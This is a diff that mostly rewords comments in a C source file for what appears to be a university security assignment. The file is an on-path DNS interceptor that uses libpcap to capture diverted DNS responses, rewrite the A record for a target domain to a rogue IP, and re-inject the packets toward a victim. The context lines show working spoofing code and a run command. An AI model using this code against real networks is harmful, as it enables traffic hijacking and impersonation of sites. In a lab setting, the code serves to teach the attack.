@@ -1,26 +1,25 @@
 /*
- * dns_intercept.c  --  on-path DNS interceptor (libpcap capture + inject)
+ * dns_intercept.c : on-path DNS interceptor (libpcap capture + inject)
  *
- * CS6008 Assignment 2, shared attack engine for Phases 2, 4 and 6.
+ * CS6008 Assignment 2. Shared attack tool for phases 2, 4 and 6.
  *
- * Position: the attacker sits on a subnet and the router is configured (by a
- * routing diversion, NOT by this program) to send the victim's inbound DNS
- * responses to us at layer 2. The kernel would drop those frames (dst IP is not
- * ours and we do NOT ip_forward), so we capture them with libpcap and re-inject
- * them toward the real victim with pcap_inject -- relaying transparently, except
- * we rewrite the answer for one target name.
+ * The attacker sits on a subnet, and a route on the router (not this program)
+ * sends the victim's inbound DNS responses to us at layer 2. The kernel drops
+ * those frames, since the dst IP isn't ours and we don't ip_forward, so we grab
+ * them with libpcap and send them on toward the victim with pcap_inject. We
+ * relay everything untouched, except we rewrite the answer for one name.
  *
- *   relay  : forward every diverted packet unchanged  (transparency check)
- *   forge  : for <target> A responses, overwrite the A rdata with <rogue-ip>;
- *            everything else (incl. www.<target>) is relayed untouched
+ *   relay  : forward every diverted packet unchanged (transparency check)
+ *   forge  : for <target> A responses, set the A rdata to <rogue-ip>; everything
+ *            else, including www.<target>, is relayed untouched
  *
- * Phase 4 (strip) and Phase 6 (last-mile) extend forge_or_relay() -- see the
- * hooks marked PHASE4 / PHASE6 below.
+ * Phase 4 (strip) and phase 6 (last-mile) extend forge_or_relay(); see the
+ * PHASE4 / PHASE6 notes below.
  *
  * Build:  make           (needs libpcap-dev)
  * Run  :  ./dns_intercept -i eth0 -v 172.16.2.10 -t example.com -r 172.16.1.30 -m forge
  *
- * Only standard POSIX + libpcap are used (no Scapy/dnspython, per the brief).
+ * Uses only POSIX + libpcap (no Scapy or dnspython, per the brief).
  */
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -36,7 +35,7 @@
 #include <netinet/udp.h>
 #include <pcap.h>
 
-/* ---- config (set from argv) ---- */
+/* config (from argv) */
 static char      g_iface[64]   = "eth0";
 static char      g_target[256] = "example.com";   /* name to hijack           */
 static uint32_t  g_rogue_ip    = 0;                /* rogue A rdata (net order)*/
@@ -47,7 +46,7 @@ static uint8_t   g_victim_mac[6];                  /* next hop toward victim   *
 static pcap_t   *g_pcap        = NULL;
 static long      g_seen = 0, g_forged = 0, g_relayed = 0;
 
-/* ---------- checksums ---------- */
+/* checksums */
 static uint16_t cksum16(const uint16_t *p, int len, uint32_t sum)
 {
     while (len > 1) { sum += *p++; len -= 2; }
@@ -74,9 +73,9 @@ static void fix_checksums(struct ip *ip4, struct udphdr *udp, int udp_len)
     if (udp->uh_sum == 0) udp->uh_sum = 0xffff; /* 0 means "no checksum" in v4 */
 }
 
-/* ---------- DNS helpers ---------- */
+/* DNS helpers */
 /* Read a DNS name starting at *p (within [base,end)); advance *p past it in the
- * wire sense (stops at the first label -- compression pointers end the name).
+ * wire sense (stops at the first label; compression pointers end the name).
  * Writes a dotted, lowercased name into out. Returns 0 on success. */
 static int dns_read_name(const uint8_t *base, const uint8_t *end,
                          const uint8_t **p, char *out, size_t outsz)
@@ -85,7 +84,7 @@ static int dns_read_name(const uint8_t *base, const uint8_t *end,
     const uint8_t *after = NULL;
     while (q < end) {
         uint8_t len = *q;
-        if ((len & 0xc0) == 0xc0) {                 /* compression pointer */
+        if ((len & 0xc0) == 0xc0) {                 /* compressed name pointer */
             if (q + 1 >= end) return -1;
             if (!jumped) after = q + 2;
             uint16_t off = ((len & 0x3f) << 8) | q[1];
@@ -93,7 +92,7 @@ static int dns_read_name(const uint8_t *base, const uint8_t *end,
             if (q >= end) return -1;
             continue;
         }
-        if (len == 0) { q++; break; }               /* root -> end of name */
+        if (len == 0) { q++; break; }               /* zero length label = end of name */
         if (len > 63 || q + 1 + len > end) return -1;
         for (int i = 0; i < len; i++) {
             char c = (char)q[1 + i];
@@ -140,7 +139,7 @@ static int forge_or_relay(uint8_t *dns, int dlen)
     const uint8_t *base = dns, *end = dns + dlen;
     const uint8_t *p = dns + sizeof(struct dnshdr);
 
-    /* --- question: read QNAME, QTYPE --- */
+    /* question: read QNAME, QTYPE */
     char qname[256];
     if (dns_read_name(base, end, &p, qname, sizeof qname) < 0) return 1;
     if (p + 4 > end) return 1;
@@ -160,7 +159,7 @@ static int forge_or_relay(uint8_t *dns, int dlen)
         p += 4;
     }
 
-    /* --- answers: overwrite A rdata --- */
+    /* answers: overwrite A rdata */
     int changed = 0;
     for (int i = 0; i < an; i++) {
         p = dns_skip_name(end, p);
